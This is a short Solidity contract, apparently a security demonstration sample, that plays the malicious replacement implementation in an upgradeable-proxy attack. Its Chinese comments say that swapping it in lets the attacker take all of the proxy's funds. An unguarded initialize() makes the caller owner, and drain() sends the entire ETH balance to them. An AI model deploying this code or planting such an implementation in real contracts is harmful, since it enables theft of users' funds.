// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title MaliciousImplementation - 恶意代理实现
/// @notice 攻击者替换实现合约后，可提取代理合约的所有资金
contract MaliciousImplementation {
    address public owner;
    uint256 public value;

    function initialize() external {
        owner = msg.sender; // 攻击者成为 owner!
    }

    // 新增函数：允许提取代理合约的所有 ETH
    function drain() external {
        require(msg.sender == owner);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}
